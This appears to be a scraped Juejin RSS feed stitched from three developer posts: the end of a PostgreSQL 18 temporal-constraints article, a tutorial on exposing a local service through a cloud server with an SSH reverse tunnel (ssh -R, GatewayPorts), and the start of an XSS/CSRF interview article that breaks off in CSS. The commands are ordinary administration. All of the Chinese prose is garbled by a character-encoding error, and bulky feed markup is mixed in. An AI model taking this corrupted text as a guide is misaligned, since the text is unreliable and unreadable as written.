<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> subscriptions (
  user_id uuid <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  type <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  valid_period daterange <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  <span class="hljs-keyword">FOREIGN</span> KEY (user_id) <span class="hljs-keyword">REFERENCES</span> users(id),
  <span class="hljs-keyword">UNIQUE</span> (user_id, valid_period <span class="hljs-keyword">WITHOUT</span> <span class="hljs-keyword">OVERLAPS</span>)
);
</code></pre>
<p>å¦‚ä½ æ‰€è§ï¼Œæˆ‘ä»¬åœ¨ <code>valid_period</code> è¿™ä¸ª <code>daterange</code> å­—æ®µçš„ <code>UNIQUE</code> çº¦æŸä¸­ä½¿ç”¨äº† <code>WITHOUT OVERLAPS</code>ã€‚æ—¶é—´çº¦æŸè¦æ±‚é”®åˆ—ï¼ˆ<code>valid_period</code>ï¼‰å¿…é¡»æ˜¯èŒƒå›´ç±»å‹ï¼ˆrange typeï¼‰ï¼Œå› æ­¤é€šå¸¸ä½ ä¼šä½¿ç”¨ <code>daterange</code> æˆ– <code>timestamprange</code>ï¼Œä½†å®ƒä¹Ÿé€‚ç”¨äºå…¶ä»–èŒƒå›´ç±»å‹ã€‚</p>
<h3 data-id="heading-3">æµ‹è¯•ä¸€ä¸‹</h3>
<p>è®©æˆ‘ä»¬æ’å…¥ä¸€äº›æ•°æ®ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> subscriptions (user_id, type, valid_period)
<span class="hljs-keyword">SELECT</span> u.id, <span class="hljs-string">'basic'</span>, daterange(<span class="hljs-string">'2024-01-01'</span>, <span class="hljs-string">'2025-01-01'</span>, <span class="hljs-string">'[)'</span>)
<span class="hljs-keyword">FROM</span> users u;

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> subscriptions (user_id, type, valid_period)
<span class="hljs-keyword">SELECT</span> u.id, <span class="hljs-string">'premium'</span>, daterange(<span class="hljs-string">'2025-01-01'</span>, <span class="hljs-string">'2026-01-01'</span>, <span class="hljs-string">'[)'</span>)
<span class="hljs-keyword">FROM</span> users u
<span class="hljs-keyword">WHERE</span> u.email <span class="hljs-operator">=</span> <span class="hljs-string">'darth@example.com'</span>;

<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> subscriptions;
</code></pre>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-text" lang="text">               user_id                |  type   |      valid_period
--------------------------------------+---------+-------------------------
 0199f293-291a-70bf-b9ee-872247723d29 | basic   | [2024-01-01,2025-01-01)
 0199f293-291b-737a-9bd0-e0e0853e3377 | basic   | [2024-01-01,2025-01-01)
 0199f293-291a-70bf-b9ee-872247723d29 | premium | [2025-01-01,2026-01-01)
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒLuke æ˜¾ç„¶åœ¨ 2025 å¹´åœæ­¢äº†ä»˜è´¹ï¼Œè€Œ Darth å‡çº§åˆ°äº†é«˜çº§ç‰ˆã€‚æˆ‘é€šå¸¸ä¹ æƒ¯ä½¿ç”¨å•ç‹¬çš„åˆ—æ¥è¡¨ç¤ºå¼€å§‹å’Œç»“æŸæ—¥æœŸï¼Œä½†æˆ‘å¾ˆæ¬£èµèŒƒå›´ç±»å‹ï¼ˆRangesï¼‰èƒ½å¤Ÿå¯ç”¨æ­¤åŠŸèƒ½ï¼Œå¹¶å…è®¸æˆ‘ä»¬ä½¿ç”¨å¼ºå¤§çš„èŒƒå›´è¿ç®—ç¬¦ã€‚</p>
<h3 data-id="heading-4">é¢å¤–å†…å®¹ï¼šæŸ¥è¯¢æ´»è·ƒè®¢é˜…</h3>
<p>ä½¿ç”¨â€œå†°æ·‡æ·‹ç­’â€è¿ç®—ç¬¦ï¼ˆ<code>@&gt;</code>ï¼Œå³åŒ…å«è¿ç®—ç¬¦ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾æ‰¾åˆ°ç‰¹å®šæ—¥æœŸæœ‰æ•ˆçš„è®¢é˜…ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> subscriptions
<span class="hljs-keyword">WHERE</span> valid_period @<span class="hljs-operator">&gt;</span> <span class="hljs-string">'2025-01-01'</span>::<span class="hljs-type">date</span>;
</code></pre>
<p>è¿™ä¸ªæŸ¥è¯¢ä¼šå‘Šè¯‰æˆ‘ä»¬å“ªäº›è®¢é˜…åœ¨ 2025 å¹´ 1 æœˆ 1 æ—¥æ˜¯æ´»è·ƒçš„ã€‚</p>
<h3 data-id="heading-5">é‡è¦æç¤ºï¼šGIST ä¸ B-Tree ç´¢å¼•</h3>
<p>æœ‰ä¸€ä¸ªé™·é˜±ï¼šèŒƒå›´åˆ—ä½¿ç”¨ GIST ç´¢å¼•ï¼Œè€Œ UUID åˆ—ä½¿ç”¨ B-Tree ç´¢å¼•ã€‚å½“æˆ‘è¿è¡Œ <code>CREATE TABLE subscriptions</code> å‘½ä»¤æ—¶ï¼Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªé”™è¯¯ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½ éœ€è¦å¯ç”¨ä»¥ä¸‹æ‰©å±•ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> EXTENSION btree_gist;
</code></pre>
<h2 data-id="heading-6">äº†è§£æ›´å¤š</h2>
<p>å¦‚æœä½ æƒ³æ·±å…¥äº†è§£æ—¶é—´çº¦æŸï¼Œè¯·æŸ¥çœ‹ PostgreSQL æ–‡æ¡£ä¸­å…³äº <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dhttps%3A%2F%2Fwww.postgresql.org%2Fdocs%2Fdevel%2Fddl-constraints.html%2523DDL-CONSTRAINTS-UNIQUE-WITHOUT-OVERLAPS" target="_blank" title="https://www.google.com/search?q=https://www.postgresql.org/docs/devel/ddl-constraints.html%23DDL-CONSTRAINTS-UNIQUE-WITHOUT-OVERLAPS" ref="nofollow noopener noreferrer">WITHOUT OVERLAPS</a> çš„éƒ¨åˆ†ã€‚</p>
<p>åŸæ–‡é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fhashrocket.com%2Fblog%2Fposts%2Fpostgresql-18-temporal-constraints" target="_blank" title="https://hashrocket.com/blog/posts/postgresql-18-temporal-constraints" ref="nofollow noopener noreferrer">hashrocket.com/blog/posts/â€¦</a></p>
<p>ä½œè€…ï¼šVinicius Negrisolo</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•é€šè¿‡xshellå®ç°å»ºç«‹åå‘éš§é“ï¼Œé€šè¿‡äº‘æœåŠ¡å™¨çš„è®¿é—®æœ¬åœ°æœåŠ¡]]></title>    <link>https://juejin.cn/post/7576968345875808283</link>    <guid>https://juejin.cn/post/7576968345875808283</guid>    <pubDate>2025-11-27T07:54:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576968345875808283" data-draft-id="7576968345875234843" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•é€šè¿‡xshellå®ç°å»ºç«‹åå‘éš§é“ï¼Œé€šè¿‡äº‘æœåŠ¡å™¨çš„è®¿é—®æœ¬åœ°æœåŠ¡"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-11-27T07:54:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dyw08"/> <meta itemprop="url" content="https://juejin.cn/user/2174157519593227"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•é€šè¿‡xshellå®ç°å»ºç«‹åå‘éš§é“ï¼Œé€šè¿‡äº‘æœåŠ¡å™¨çš„è®¿é—®æœ¬åœ°æœåŠ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2174157519593227/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dyw08
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:54:04.000Z" title="Thu Nov 27 2025 07:54:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>1ã€é€‰æ‹©äº‘æœåŠ¡å™¨ä¸Šé¢ä¸€ä¸ªç«¯å£ï¼Œæ¯”å¦‚8015ï¼Œå¦‚æœæ˜¯é˜¿é‡Œäº‘éœ€è¦æŠŠå®‰å…¨ç­–ç•¥æ‰“å¼€è¿™ä¸ªç«¯å£ï¼Œå…è®¸å¤–éƒ¨æ”¾è¿™ä¸ªç«¯å£åœ°å€ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f48bc6d3ed143b2ab43d725d3a8a609~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZHl3MDg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834844&amp;x-signature=muN%2F6a6%2FMx6LQ7A4m429luXr8JM%3D" alt="image.png" loading="lazy"/></p>
<p>2ã€é€šè¿‡xshellç™»é™†åˆ°äº‘æœåŠ¡å™¨ä¸Šé¢ï¼Œå¦‚æœé˜²ç«å¢™æ˜¯æ‰“å¼€çš„ï¼Œéœ€è¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<h2 data-id="heading-0">æ£€æŸ¥é˜²ç«å¢™çŠ¶æ€</h2>
<pre><code class="hljs language-lua" lang="lua">systemctl <span class="hljs-built_in">status</span> firewalld
</code></pre>
<h2 data-id="heading-1">æ”¾è¡Œ8015ç«¯å£ï¼ˆå¦‚æœé˜²ç«å¢™å¼€å¯ï¼‰</h2>
<pre><code class="hljs language-css" lang="css">firewall-cmd <span class="hljs-attr">--add-port</span>=<span class="hljs-number">8015</span>/tcp <span class="hljs-attr">--permanent</span>
firewall-cmd <span class="hljs-attr">--reload</span>
</code></pre>
<h2 data-id="heading-2">æŸ¥çœ‹é˜²ç«å¢™å½“å‰å¼€æ”¾çš„æ‰€æœ‰ç«¯å£</h2>
<pre><code class="hljs language-css" lang="css">firewall-cmd <span class="hljs-attr">--list-ports</span>
</code></pre>
<p>3ã€ æ£€æŸ¥SSHæœåŠ¡é…ç½®ï¼ˆå…³é”®ï¼ï¼‰</p>
<pre><code class="hljs language-bash" lang="bash">ç¼–è¾‘ /etc/ssh/sshd_config 
</code></pre>
<h2 data-id="heading-3">å¿…é¡»å¼€å¯çš„é…ç½®</h2>
<h2 data-id="heading-4">å…è®¸å¤–éƒ¨è®¿é—®è½¬å‘ç«¯å£</h2>
<pre><code class="hljs language-bash" lang="bash">GatewayPorts <span class="hljs-built_in">yes</span> 
</code></pre>
<h2 data-id="heading-5">å…è®¸ç«¯å£è½¬å‘</h2>
<pre><code class="hljs language-bash" lang="bash">AllowTcpForwarding <span class="hljs-built_in">yes</span>
</code></pre>
<h2 data-id="heading-6">é‡å¯SSHæœåŠ¡</h2>
<pre><code class="hljs">systemctl restart sshd
</code></pre>
<p>4ã€æœ¬åœ°xshelléš§é“é…ç½®</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c262348e4854e21b18434b3adfe0fb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZHl3MDg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834844&amp;x-signature=rZf2xp51CDsJlCRL0WaXVBm84qE%3D" alt="image.png" loading="lazy"/></p>
<p>é€‰æ‹©è¿œç¨‹ä¼ å…¥æ–¹å¼ï¼Œç„¶åæºä¸»æœºè¾“å…¥äº‘æœåŠ¡å™¨ipï¼Œç«¯å£é€‰æ‹©ä¸Šé¢é…ç½®çš„ç«¯å£ï¼Œå¦‚8015ï¼›ç›®æ ‡ä¸»æœºå¡«å†™éœ€è¦ä»£ç†è¿‡å»çš„ipï¼Œå¦‚ 127.0.0.1 æˆ–è€…å†…ç½‘IP ,ç›®æ ‡ç«¯å£ä¸ºä½ è‡ªå·±ç¨‹åºéœ€è¦è®¿é—®çš„ç«¯å£ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99e87ef4fae8420fa71e82f041fad4d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZHl3MDg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834844&amp;x-signature=5p8S3Caa5FfZ8ao0yBpHQILt9Ug%3D" alt="image.png" loading="lazy"/></p>
<p>5ã€windowç³»ç»Ÿä¸­å¯åŠ¨cmdå‘½ä»¤ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p>
<h2 data-id="heading-7">ä»æœ¬åœ°æœºå™¨æ‰§è¡Œï¼ˆæ³¨æ„æ–¹å‘ï¼ï¼‰</h2>
<pre><code class="hljs language-kotlin" lang="kotlin">ssh -R <span class="hljs-number">8015</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8014</span> <span class="hljs-symbol">username@</span><span class="hljs-number">139.</span>*.*<span class="hljs-number">.164</span>
</code></pre>
<p>è¿™ä¸€æ­¥å°±æ˜¯æŠŠæœ¬åœ°8014ç«¯å£å’Œäº‘æœåŠ¡å™¨çš„8015çš„è®¿é—®è¯·æ±‚ç»‘å®šåœ¨ä¸€èµ·äº†</p>
<h2 data-id="heading-8">ä¿æŒsshé•¿æ—¶é—´é“¾æ¥å‘½ä»¤</h2>
<pre><code class="hljs language-ini" lang="ini">ssh -o <span class="hljs-attr">ServerAliveInterval</span>=<span class="hljs-number">60</span> -R <span class="hljs-number">8015</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8014</span> username@ip
</code></pre>
<p>6ã€å¼€å§‹æ£€æµ‹å’ŒéªŒè¯ç»“æœ</p>
<p>æœåŠ¡å™¨ä¸Šé¢æ‰§è¡Œçš„ï¼š</p>
<h2 data-id="heading-9">æŸ¥çœ‹8015ç«¯å£ç›‘å¬æƒ…å†µï¼ˆåº”æ˜¾ç¤ºsshdç›‘å¬ï¼‰</h2>
<pre><code class="hljs language-perl" lang="perl">netstat -tuln | <span class="hljs-keyword">grep</span> <span class="hljs-number">8015</span>
</code></pre>
<h2 data-id="heading-10">é¢„æœŸè¾“å‡ºï¼š</h2>
<pre><code class="hljs language-ruby" lang="ruby">tcp   <span class="hljs-number">0</span>   <span class="hljs-number">0</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">8015</span>    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:*</span>     <span class="hljs-variable constant_">LISTEN</span>
</code></pre>
<p>æµ‹è¯•è”é€šæ€§ï¼š</p>
<h2 data-id="heading-11">åœ¨æœåŠ¡å™¨ä¸Šæµ‹è¯•æœ¬åœ°è½¬å‘</h2>
<pre><code class="hljs language-arduino" lang="arduino">curl -v http:<span class="hljs-comment">//127.0.0.1:8015/</span>
</code></pre>
<h2 data-id="heading-12">ä»å…¶ä»–æœºå™¨æµ‹è¯•å…¬ç½‘è®¿é—®</h2>
<pre><code class="hljs language-arduino" lang="arduino">curl -v http:<span class="hljs-comment">//139.196.111.164:8015/</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e82f73d3087b40b18b70eb224340d024~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZHl3MDg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834844&amp;x-signature=Ks2tDjj6GDAKRjVU3PPrckovtzg%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…³äºXSSå’ŒCSRFï¼Œé¢è¯•å®˜æ›´å–œæ¬¢è¿™æ ·çš„å›ç­”ï¼]]></title>    <link>https://juejin.cn/post/7577049352838660111</link>    <guid>https://juejin.cn/post/7577049352838660111</guid>    <pubDate>2025-11-27T07:56:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577049352838660111" data-draft-id="7576942980709695488" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…³äºXSSå’ŒCSRFï¼Œé¢è¯•å®˜æ›´å–œæ¬¢è¿™æ ·çš„å›ç­”ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,JavaScript"/> <meta itemprop="datePublished" content="2025-11-27T07:56:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç§€ç§€ä¸åªä¼šå‰ç«¯"/> <meta itemprop="url" content="https://juejin.cn/user/1410009035452887"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…³äºXSSå’ŒCSRFï¼Œé¢è¯•å®˜æ›´å–œæ¬¢è¿™æ ·çš„å›ç­”ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1410009035452887/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç§€ç§€ä¸åªä¼šå‰ç«¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:56:43.000Z" title="Thu Nov 27 2025 07:56:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 